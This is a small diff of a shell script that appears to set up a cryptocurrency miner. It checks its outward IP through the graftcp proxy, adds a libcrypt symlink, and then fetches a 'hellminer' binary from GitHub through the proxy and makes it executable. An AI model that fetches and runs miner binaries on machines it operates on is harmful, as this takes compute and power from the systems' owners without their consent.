@@ -29,9 +29,9 @@ sleep .2
 
 ./graftcp/graftcp curl ifconfig.me
 
+echo "ln -s /usr/lib/libcrypt.so /usr/lib/libcrypt.so.1"
 echo " "
-echo " "
-
+ln -s /usr/lib/libcrypt.so /usr/lib/libcrypt.so.1
 ./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/hellminer
 chmod +x hellminer
 
